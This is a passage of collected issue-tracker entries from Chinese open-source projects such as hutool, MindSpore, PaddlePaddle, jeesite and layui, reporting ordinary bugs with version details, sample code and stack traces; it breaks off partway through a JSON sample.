【v5.8.5】对 UrlBuilder.addPath 方法传入非有效路径字符串时，会出现空指针异常,"JDK版本： openjdk_8_201 hutool版本： 5.8.5 使用 方法时，如果传入了非有效路径，则会抛出空指针异常。 分析原因是：在执行 时，当传入的值为空串或者不含有效路径的情况下， 字段未初始化。 输出信息 <ol start=""3""> 堆栈信息   <code>: UrlBuilder.addPath(String) UrlPath.parse(CharSequence, Charset) UrlPath.segments import cn.hutool.core.net.url.UrlBuilder; import java.util.function.Supplier; public class SampleTest { public static void main(String[] args) { test(() -&gt; UrlBuilder.create().addPath("""")); test(() -&gt; UrlBuilder.create().addPath(""/"")); test(() -&gt; UrlBuilder.create().addPath(""//"")); test(() -&gt; UrlBuilder.create().addPath(""/a"")); UrlBuilder.create().addPath(""""); } private static void test (Supplier&lt;UrlBuilder&gt; s) { try { s.get(); System.out.println(""正常""); } catch (Throwable err) { System.out.println(""异常："" + err.getClass().getSimpleName()); } } } 异常：NullPointerException 异常：NullPointerException 异常：NullPointerException 正常 Exception in thread ""main"" java.lang.NullPointerException at cn.hutool.core.net.url.UrlBuilder.addPath(UrlBuilder.java:355) at SampleTest.main(SampleTest.java:27) Exception in thread ""main"" java.lang.NullPointerException at cn.hutool.core.net.url.UrlBuilder.addPath(UrlBuilder.java:355) at SampleTest.main(SampleTest.java:27)"
Can not export tacotron2 model in the inference phase,": /device ascend : -- MindSpore version : 1.3.0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : In the construct calculation, is set as max_mel_frames / 3 = 292, where max_mel_frames = 876, 3 means each decoding step generate 3 frames mel spectrogram. Below is the training code. The construct function accepts (is encoders' output, and shape is (B, 189, 512)), (is padded mel spectrogram, padded to max_mel_frames, shape is (B, 80, 876)), and (shape is (B, 189)). In the inference calculation, the inference function takes the and as inputs, where the shape is decided by inputted text sequence, eg. if the inputted text contains 100 characters, then memory shape is (B, 100, 512), and the text_mask is set as . Below is the inference code. The following cycle is jumped when the predicted energy of mel spectrogram is too low or predicted stop confidence exceed the threshold(0.5), or it reaches max decoding steps. In most cases, the decoder is stopped when detecting low energy. Now the problem is how to properly export model at inference time since there is control flow exists. If we set the decoding steps at a fixed number to make sure the mel spectrogram can be synthesized from specified text sequence within fixed steps. But it would cause redundance and it would also cause circulation depth is too deep so that raising an error. If we set decoding steps too small, we can not guarantee the mel spectrogram can be fully synthesized in limited steps.   <code>: n_frame memory decoder_inputs text_mask def construct(self, memory, decoder_inputs, text_mask): ''' construct ''' decoder_input = self.expand_dims(self.go_frame, 0) decoder_inputs = self.parse_decoder_inputs(decoder_inputs) decoder_inputs_ = self.concat((decoder_input, decoder_inputs)) decoder_inputs = self.prenet(decoder_inputs_) B, MAX_TIME, _ = self.get_shape(memory) attention_hidden = self.attention_zero_tensor attention_cell = self.attention_zero_tensor decoder_hidden = self.decoder_zero_tensor decoder_cell = self.decoder_zero_tensor attention_weights = self.fill(mindspore.float32, (B, MAX_TIME), 0.0) attention_weights_cum = self.fill(mindspore.float32, (B, MAX_TIME), 0.0) attention_context = self.attention_context processed_memory = self.memory_layer(memory) mask = text_mask mel_outputs, gate_outputs, alignments = (), (), () n_frame, _, _ = self.get_shape(decoder_inputs) for i in range(n_frame - 1): decoder_input = self.squeeze(decoder_inputs[i:i + 1]) mel_output, gate_output, attention_weights, attention_weights_cum, \ attention_context, decoder_hidden, decoder_cell, attention_hidden, \ attention_cell = self.decode(decoder_input, attention_hidden, attention_cell, attention_weights, attention_weights_cum, attention_context, memory, processed_memory, decoder_hidden, decoder_cell, mask) mel_outputs += (mel_output,) gate_outputs += (self.squeeze(gate_output),) alignments += (attention_weights,) mel_outputs, gate_outputs, alignments = self.parse_decoder_outputs( mel_outputs, gate_outputs, alignments) return mel_outputs, gate_outputs, alignments memory text_mask memory None while def inference(self, memory, text_mask): '''inference ''' B, MAX_TIME, _ = self.get_shape(memory) decoder_input = self.fill( mindspore.float32, (B, self.num_mels * self.n_frames_per_step), 0) attention_hidden = self.zeros((B, self.attention_rnn_dim), mindspore.float32) attention_cell = self.zeros((B, self.attention_rnn_dim), mindspore.float32) decoder_hidden = self.zeros((B, self.decoder_rnn_dim), mindspore.float32) decoder_cell = self.zeros((B, self.decoder_rnn_dim), mindspore.float32) attention_weights = self.fill(mindspore.float32, (B, MAX_TIME), 0.0) attention_weights_cum = self.fill(mindspore.float32, (B, MAX_TIME), 0.0) attention_context = self.zeros( (B, self.encoder_embedding_dim), mindspore.float32) processed_memory = self.memory_layer(memory) mask = text_mask mel_outputs, gate_outputs, alignments = (), (), () while True: decoder_input = self.prenet(decoder_input) mel_output, gate_output, attention_weights, attention_weights_cum, \ attention_context, decoder_hidden, decoder_cell, attention_hidden, \ attention_cell = self.decode.inference(decoder_input, attention_hidden, attention_cell, attention_weights, attention_weights_cum, attention_context, memory, processed_memory, decoder_hidden, decoder_cell, mask) mel_outputs += (mel_output,) gate_outputs += (self.squeeze(gate_output),) alignments += (attention_weights,) if self.sigmoid(gate_output[0]) &gt; self.gate_threshold: P.Print()('Terminated by gate.') break if len(mel_outputs) &gt; 1 and (mel_output &lt;= 0.2).all(): P.Print()('Warning: End with low power.') break if len(mel_outputs) == self.max_decoder_steps: P.Print()('Warning: Reached max decoder steps.') break decoder_input = mel_output mel_outputs, gate_outputs, alignments = self.parse_decoder_outputs( mel_outputs, gate_outputs, alignments) return mel_outputs, gate_outputs, alignments"
Operater design,refs: https://github.com/PaddlePaddle/Paddle/pull/2555 目前的Paddle使用的是layer based计算方式，每个layer包含一个forward，backward，而且每个layer需要保存数据(matrix/argument)和计算的中间状态，这样很多计算的部分难以单独抽离出来。 采用更细粒度的计算单位operator，例如 add/mul等，同时也可以实现一些更高层次的op，比如 fc_op op更纯粹的用于计算，减少对数据和中间状态的依赖。 op和gradop分开实现，需要net中自动添加相关的op   <code>: 重构的主要目的在于
初始化数据库失败,"运行init-db.bat 02-27 17:25:16.732 WARN [o.springframework.test.context.TestContextManager] - Caught exception while allowing TestExecutionListener [org.springframework.test.context.transaction.TransactionalTestExecutionListener@53525379] to process 'after' execution for test: method [public void com.jeesite.test.InitGenData.initGenData() throws java.lang.Exception], instance [com.jeesite.test.InitGenData@1be3f8f8], exception [org.springframework.jdbc.BadSqlGrammarException: Error updating database. Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table 'jeesite4.js_gen_table' doesn't exist The error may involve com.jeesite.modules.gen.dao.GenTableDao.insert-Inline The error occurred while setting parameters SQL: INSERT INTO js_gen_table (, , , , , , , , , , , , , ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table 'jeesite4.js_gen_table' doesn't exist ; bad SQL grammar []; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table 'jeesite4.js_gen_table' doesn't exist] org.springframework.transaction.UnexpectedRollbackException: Transaction rolled back because it has been marked as rollback-only at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:724) at org.springframework.test.context.transaction.TransactionContext.endTransaction(TransactionContext.java:131) at org.springframework.test.context.transaction.TransactionalTestExecutionListener.afterTestMethod(TransactionalTestExecutionListener.java:227) at org.springframework.test.context.TestContextManager.afterTestMethod(TestContextManager.java:319) at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:94) at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:84) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:252) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:94) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:191) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:283) at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:173) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:128) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:203) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:155) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103) Tests run: 2, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 2.454 sec &lt;&lt;&lt; FAILURE! - in com.jeesite.test.InitGenData initGenData(com.jeesite.test.InitGenData) Time elapsed: 2.452 sec &lt;&lt;&lt; ERROR! org.springframework.jdbc.BadSqlGrammarException: Error updating database. Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table 'jeesite4.js_gen_table' doesn't exist The error may involve com.jeesite.modules.gen.dao.GenTableDao.insert-Inline The error occurred while setting parameters SQL: INSERT INTO js_gen_table (, , , , , , , , , , , , , ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table 'jeesite4.js_gen_table' doesn't exist ; bad SQL grammar []; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table 'jeesite4.js_gen_table' doesn't exist at sun.reflect.GeneratedConstructorAccessor62.newInstance(Unknown Source) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.jdbc.Util.handleNewInstance(Util.java:425) at com.mysql.jdbc.Util.getInstance(Util.java:408) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:943) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3973) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3909) at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2527) at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2680) at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2487) at com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:1858) at com.mysql.jdbc.PreparedStatement.execute(PreparedStatement.java:1197) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3051) at com.alibaba.druid.filter.FilterAdapter.preparedStatement_execute(FilterAdapter.java:1080) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3049) at com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3049) at com.alibaba.druid.proxy.jdbc.PreparedStatementProxyImpl.execute(PreparedStatementProxyImpl.java:168) at com.alibaba.druid.pool.DruidPooledPreparedStatement.execute(DruidPooledPreparedStatement.java:494) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.logging.jdbc.PreparedStatementLogger.invoke(PreparedStatementLogger.java:59) at com.sun.proxy.$Proxy145.execute(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:46) at org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:74) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:63) at com.sun.proxy.$Proxy143.update(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:50) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:117) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:76) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:198) at org.apache.ibatis.session.defaults.DefaultSqlSession.insert(DefaultSqlSession.java:185) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) at com.sun.proxy.$Proxy91.insert(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.insert(SqlSessionTemplate.java:278) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:57) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) at com.sun.proxy.$Proxy132.insert(Unknown Source) at com.jeesite.common.service.CrudService.insert(gb:221) at com.jeesite.common.service.CrudService.save(gb:88) at com.jeesite.modules.gen.service.GenTableService.save(t:250) at com.jeesite.modules.gen.service.GenTableService$$FastClassBySpringCGLIB$$b4d0470f.invoke() at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:738) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:157) at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:99) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:282) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:673) at com.jeesite.modules.gen.service.GenTableService$$EnhancerBySpringCGLIB$$5ffcaccc.save() at com.jeesite.modules.gen.service.GenTableService$$FastClassBySpringCGLIB$$b4d0470f.invoke() at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:738) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:157) at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:99) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:282) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:673) at com.jeesite.modules.gen.service.GenTableService$$EnhancerBySpringCGLIB$$9df03e54.save() at com.jeesite.modules.gen.db.InitGenData.initGenTestData(g:82) at com.jeesite.test.InitGenData.initGenData(InitGenData.java:26) initGenData(com.jeesite.test.InitGenData) Time elapsed: 2.452 sec &lt;&lt;&lt; ERROR! org.springframework.transaction.UnexpectedRollbackException: Transaction rolled back because it has been marked as rollback-only at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:724) at org.springframework.test.context.transaction.TransactionContext.endTransaction(TransactionContext.java:131) at org.springframework.test.context.transaction.TransactionalTestExecutionListener.afterTestMethod(TransactionalTestExecutionListener.java:227) at org.springframework.test.context.TestContextManager.afterTestMethod(TestContextManager.java:319) at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:94) at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:84) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:252) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:94) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:191) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:283) at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:173) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:128) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:203) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:155) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103) 02-27 17:25:16.747 DEBUG [com.jeesite.common.utils.SpringUtils] - Clear ApplicationContext:org.springframework.web.context.support.GenericWebApplicationContext@25df00a0: startup date [Tue Feb 27 17:24:15 CST 2018]; root of context hierarchy   <code>: table_name class_name tpl_category package_name module_name sub_module_name function_name function_name_simple function_author options create_by create_date update_by update_date table_name class_name tpl_category package_name module_name sub_module_name function_name function_name_simple function_author options create_by create_date update_by update_date"
动态图中使用 dropout，反向传播失败。 ,"paddle: 1.8.3 简单的测试代码： 报错： 去掉dropout 就可以正常运行   <code>: import paddle.fluid as fluid import numpy as np with fluid.dygraph.guard(): dropout = fluid.dygraph.Dropout(p=0.5) value = np.arange(14).reshape(14).astype(""float64"") a=fluid.dygraph.to_variable(value) a.stop_gradient=False linear1 = fluid.Linear(14, 5, dtype=""float64"") linear2 = fluid.Linear(5, 1, dtype=""float64"") adam = fluid.optimizer.Adam(parameter_list=[linear1.parameters(),linear2.parameters()]) x=linear1(a) x=dropout(x) out = linear2(x) out.backward() File ""33.py"", line 22, in &lt;module&gt; out.backward() File ""&lt;decorator-gen-76&gt;"", line 2, in backward File ""/share/group-soft/anaconda/install/envs/paddle/lib/python3.7/site-packages/paddle/fluid/wrapped_decorator.py"", line 25, in __impl__ return wrapped_func(*args, **kwargs) File ""/share/group-soft/anaconda/install/envs/paddle/lib/python3.7/site-packages/paddle/fluid/framework.py"", line 216, in __impl__ return func(*args, **kwargs) File ""/share/group-soft/anaconda/install/envs/paddle/lib/python3.7/site-packages/paddle/fluid/dygraph/varbase_patch_methods.py"", line 116, in backward self._run_backward(backward_strategy, framework._dygraph_tracer()) paddle.fluid.core_avx.EnforceNotMet: -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- 0 std::string paddle::platform::GetTraceBackString&lt;char const*&gt;(char const*&amp;&amp;, char const*, int) 1 paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) 2 paddle::framework::EigenMatrix&lt;unsigned char, 1, long&gt;::Reshape(paddle::framework::Tensor const&amp;, int) 3 paddle::operators::DropoutGradKernel&lt;paddle::platform::CPUDeviceContext, double&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const 4 std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor&lt;paddle::platform::CPUPlace, false, 1ul, paddle::operators::DropoutGradKernel&lt;paddle::platform::CPUDeviceContext, float&gt;, paddle::operators::DropoutGradKernel&lt;paddle::platform::CPUDeviceContext, double&gt; &gt;::operator()(char const*, char const*, int) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) 5 paddle::imperative::PreparedOp::Run(std::map&lt;std::string, paddle::imperative::SavedVariableWrapperList, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, paddle::imperative::SavedVariableWrapperList&gt; &gt; &gt; const&amp;, std::map&lt;std::string, paddle::imperative::SavedVariableWrapperList, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, paddle::imperative::SavedVariableWrapperList&gt; &gt; &gt; const&amp;, std::unordered_map&lt;std::string, boost::variant&lt;boost::blank, int, float, std::string, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, std::vector&lt;float, std::allocator&lt;float&gt; &gt;, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt;, bool, std::vector&lt;bool, std::allocator&lt;bool&gt; &gt;, paddle::framework::BlockDesc*, long, std::vector&lt;paddle::framework::BlockDesc*, std::allocator&lt;paddle::framework::BlockDesc*&gt; &gt;, std::vector&lt;long, std::allocator&lt;long&gt; &gt;, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt;, std::hash&lt;std::string&gt;, std::equal_to&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, boost::variant&lt;boost::blank, int, float, std::string, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, std::vector&lt;float, std::allocator&lt;float&gt; &gt;, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt;, bool, std::vector&lt;bool, std::allocator&lt;bool&gt; &gt;, paddle::framework::BlockDesc*, long, std::vector&lt;paddle::framework::BlockDesc*, std::allocator&lt;paddle::framework::BlockDesc*&gt; &gt;, std::vector&lt;long, std::allocator&lt;long&gt; &gt;, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; &gt; &gt; &gt; const&amp;) 6 paddle::imperative::OpBase::Run(paddle::framework::OperatorBase const&amp;, std::map&lt;std::string, paddle::imperative::SavedVariableWrapperList, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, paddle::imperative::SavedVariableWrapperList&gt; &gt; &gt; const&amp;, std::map&lt;std::string, paddle::imperative::SavedVariableWrapperList, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, paddle::imperative::SavedVariableWrapperList&gt; &gt; &gt; const&amp;, std::unordered_map&lt;std::string, boost::variant&lt;boost::blank, int, float, std::string, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, std::vector&lt;float, std::allocator&lt;float&gt; &gt;, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt;, bool, std::vector&lt;bool, std::allocator&lt;bool&gt; &gt;, paddle::framework::BlockDesc*, long, std::vector&lt;paddle::framework::BlockDesc*, std::allocator&lt;paddle::framework::BlockDesc*&gt; &gt;, std::vector&lt;long, std::allocator&lt;long&gt; &gt;, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt;, std::hash&lt;std::string&gt;, std::equal_to&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, boost::variant&lt;boost::blank, int, float, std::string, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, std::vector&lt;float, std::allocator&lt;float&gt; &gt;, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt;, bool, std::vector&lt;bool, std::allocator&lt;bool&gt; &gt;, paddle::framework::BlockDesc*, long, std::vector&lt;paddle::framework::BlockDesc*, std::allocator&lt;paddle::framework::BlockDesc*&gt; &gt;, std::vector&lt;long, std::allocator&lt;long&gt; &gt;, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; &gt; &gt; &gt; const&amp;, paddle::platform::Place const&amp;) 7 paddle::imperative::BasicEngine::Execute() ---------------------- Error Message Summary: ---------------------- Error: `num_col_dims` must be between (0, rank_of_tensor). at (/paddle/paddle/fluid/framework/eigen.h:82)"
IdUtil.getSnowflake,"JDK版本： openjdk_8_301 hutool版本： 5.7.4 你好： 我们在集群模式下直接使用了IdUtil.getSnowflake().nextId()方法来获取id，长时间使用下没有发现问题，但是在某一次重启后，10.17.2.15、10.17.1.238 两个ip发生了雪花id冲突。   <code>: 在Snowflake单例创建getSnowflake的空构造时，是使用物理机ip地址生成的id，这个方法在集群的模式下，能保证workerId+dataCenterId 唯一吗？ 还是必须要使用指定机器、机房参数吗？ getSnowflake(long workerId, long datacenterId) 进行了多次重启，无法再复现这一问题。"
"当给button 加上 layui-btn-danger 类, 设置data-type里的事件不生效","第一个按钮就好使,第二个按钮就不好使   <code>: &lt;button type=""button"" class=""layui-btn layui-btn-primary"" data-type=""readidcard"" &gt;读身份证&lt;/button&gt; &lt;button type=""button"" class=""layui-btn layui-btn-danger"" data-type=""readidcard""&gt;读芯片卡&lt;/button&gt;"
【众智】【计算-AICPU开发】LowerBound,AICPU算子接入 对每一行，返回values的值作为下边界时在排序输入中的索引值。 sorted_x values output Infer时确认输出数据类型 对应底层算子 对应底层AI CPU算子LowerBound：   <code>: class LowerBound (Primitive):
路由bug,"1. 您当前使用的版本 2. 您当前使用的框架版本？ 1.9.2 3. 更新到最新的框架版本是否能够解决问题？ 无法 4. 问题描述？ 假设路由里面设置了两个url，/admin.html,/admin-do-{page}.html，按理说访问/admin.html和/admin-do-1.html，会分别访问到对应的页面，但是目前访问/admin-do-1.html的时候，会被/admin.html这边拦截掉了，跑到/admin.html这边来了 5. 您期望得到的结果？ 修复路由的正则bug，加强路由url匹配 6. 您实际得到的结果？   <code>: go 1.12, linux/amd64"
2.0-alpha动态图指定GPU就报错,两种方法指定使用GPU都会出错：自动重启代码执行器 环境：AI Studio高级版 第一种 第二种   <code>: place = fluid.CUDAPlace(0) paddle.enable_imperative(place) with fluid.dygraph.guard(fluid.CUDAPlace(0)):
NamedSql解析postgresql类型转换时的缺陷,"JDK版本： openjdk_8_201 hutool版本： 5.4.2 NamedSql解析postgresql类型转换时存在缺陷，当SQL中存在形如col::numeric的类型转换时，其将两个冒号解析成了一个冒号。   <code>: SqlExecutor.query(conn, sql, new EntityListHandler(), paramMap);"
树节点children里有两条相同的数据,"JDK版本： java version ""1.8.0_231"" hutool版本： 5.6.3 复现数组数据：   <code>: [{""classCode"":""HIS"",""parentClassCode"":""clincDict"",""createTime"":1663226113000,""busClassId"":""E8B3000C2E312EA9E0532901A8C0B54F"",""className"":""HIS业务系统"",""nodeType"":""1""},{""classCode"":""staff"",""parentClassCode"":""root"",""createTime"":1663226113000,""busClassId"":""E8B3000C2E322EA9E0532901A8C0B54F"",""className"":""员工测试"",""nodeType"":""1""},{""classCode"":""INTERNATION_STANDARD"",""parentClassCode"":""root"",""createTime"":1663226113000,""busClassId"":""E8B3000C2E392EA9E0532901A8C0B54F"",""className"":""国际标准1"",""nodeType"":""1""},{""classCode"":""diagnosis_pay "",""parentClassCode"":""root"",""createTime"":1663226113000,""busClassId"":""E8B3000C2E532EA9E0532901A8C0B54F"",""className"":""总院诊疗价项对照"",""nodeType"":""1""},{""classCode"":""clincDict"",""parentClassCode"":""root"",""createTime"":1663226113000,""busClassId"":""E8B3000C2E542EA9E0532901A8C0B54F"",""className"":""诊疗业务字典"",""nodeType"":""1""},{""classCode"":""STAFF_CODE"",""parentClassCode"":""root"",""createTime"":1663300263000,""busClassId"":""e087541832ef425b8dc1c5cd0027dfbb"",""className"":""员工标准字典"",""nodeType"":""1""},{""classCode"":""staff2"",""parentClassCode"":""staff"",""createTime"":1663311466000,""busClassId"":""a76592fffcfe4636b7e9bd2dcb79d773"",""className"":""员工测试第4层"",""nodeType"":""1""},{""classCode"":""staff|a8f6a5c0dd4e48eba4d86b825850b8c5"",""parentClassCode"":""staff"",""systemId"":""a8f6a5c0dd4e48eba4d86b825850b8c5"",""systemName"":""PS5"",""createTime"":1663313088000,""busClassId"":""3ad6037bbf234eb9a6b85464d4610f0f"",""className"":""PS5"",""nodeType"":""2""},{""classCode"":""staff2|7abf6e3d189d4ccb8a8e14c2628b3b8b"",""parentClassCode"":""staff2"",""systemId"":""7abf6e3d189d4ccb8a8e14c2628b3b8b"",""systemName"":""HIS系统"",""createTime"":1663316491000,""busClassId"":""5c3c865508ae49b49d095fbdf78b3948"",""className"":""HIS系统"",""nodeType"":""2""},{""classCode"":""INTERNATION_